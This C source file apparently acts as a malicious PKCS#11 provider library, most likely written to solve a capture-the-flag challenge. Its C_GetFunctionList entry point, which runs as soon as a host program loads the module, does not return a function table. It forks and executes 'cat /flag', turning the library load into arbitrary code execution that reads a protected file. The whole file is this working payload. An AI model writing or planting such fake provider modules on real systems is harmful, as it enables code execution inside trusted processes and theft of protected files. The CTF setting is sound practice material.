#include "pkcs11.h"
#include <stdio.h>
#include <unistd.h>

CK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {
    
    pid_t pid = fork();

    if (pid == 0) {
        char **arg = malloc(3 *sizeof(char *));
        arg[0] = "cat";
        arg[1] = "/flag";
        arg[2] = 0;
        execve("/usr/bin/cat",arg, NULL);
    } else if(pid > 0) {
        wait(NULL);
    } else {
        perror("fork");
        return 1;
    }

    return CKR_OK;
}